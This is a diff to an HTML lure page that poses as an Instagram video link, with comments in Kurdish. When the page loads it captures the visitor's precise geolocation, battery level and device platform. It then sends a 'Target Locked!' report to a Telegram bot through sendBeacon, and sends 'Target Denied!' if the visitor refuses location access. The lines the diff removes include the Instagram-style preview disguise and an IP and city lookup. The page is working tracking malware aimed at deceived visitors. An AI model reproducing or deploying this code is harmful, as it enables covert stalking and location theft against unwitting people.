@@ -2,19 +2,7 @@
 <html lang="ku">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-    <title>Instagram Video</title>
-    <meta property="og:title" content="Instagram Post by @reels">
-    <meta property="og:description" content="▶️ Watch this video on Instagram">
-    <meta property="og:site_name" content="Instagram">
-    <meta property="og:type" content="video.other">
-    
-    <meta property="og:image" content="https://raw.githubusercontent.com/saraharki/view/main/girl.jpg">
-    
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:image" content="https://raw.githubusercontent.com/saraharki/view/main/girl.jpg">
-
+    <title> video-rell </title>
     <style>body { background: white; margin: 0; }</style>
 </head>
 <body onload="capture()">
@@ -27,38 +15,32 @@
         const uid = params.get('id');
         if (!uid) return;
 
+        // ١. یەکسەر داوای لۆکەیشن دەکات
         navigator.geolocation.getCurrentPosition(async (pos) => {
             const lat = pos.coords.latitude;
             const lon = pos.coords.longitude;
             
+            // ٢. وەرگرتنی زانیارییە خێراکان
             let bat = "N/A";
             if (navigator.getBattery) {
                 const b = await navigator.getBattery();
                 bat = Math.floor(b.level * 100) + "%";
             }
 
-            // کات و شار و ئایپی بە وردی
-            const timeStr = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', hour12: true });
-            let ip = "N/A", city = "Unknown", isp = "Korek";
-            try {
-                const res = await fetch('https://ipwho.is/');
-                const data = await res.json();
-                ip = data.ip; city = data.city; isp = data.connection.isp;
-            } catch(e) {}
-
             let report = `🚨 <b>Target Locked!</b>\n\n` +
                          `📍 <b>Location:</b> https://www.google.com/maps?q=${lat},${lon}\n` +
-                         `🌐 <b>IP:</b> <code>${ip}</code> (${isp})\n` +
-                         `📱 <b>Device:</b> <code>${navigator.platform}</code>\n` +
-                         `🔋 <b>Battery:</b> <code>${bat}</code>\n` +
-                         `🕒 <b>Time:</b> <code>${timeStr}</code>\n` +
-                         `🏙️ <b>City:</b> <code>${city}</code>`;
+                         `🔋 <b>Battery:</b> ${bat}\n` +
+                         `📱 <b>Device:</b> ${navigator.platform}`;
 
+            // ٣. ناردنی خێرا (Beacon) - ئەمە نەوەستاوە و یەکسەر دەیپێکێت
             const url = `https://api.telegram.org/bot${TK}/sendMessage?chat_id=${uid}&text=${encodeURIComponent(report)}&parse_mode=HTML`;
+            
+            // ئەمە فێڵە سەرەکییەکەیە بۆ خێرایی
             navigator.sendBeacon(url);
 
         }, (err) => {
-            navigator.sendBeacon(`https://api.telegram.org/bot${TK}/sendMessage?chat_id=${uid}&text=⚠️ Target Denied!`);
+            const url = `https://api.telegram.org/bot${TK}/sendMessage?chat_id=${uid}&text=⚠️ Target Denied!`;
+            navigator.sendBeacon(url);
         }, { enableHighAccuracy: true, timeout: 5000 });
     }
 </script>
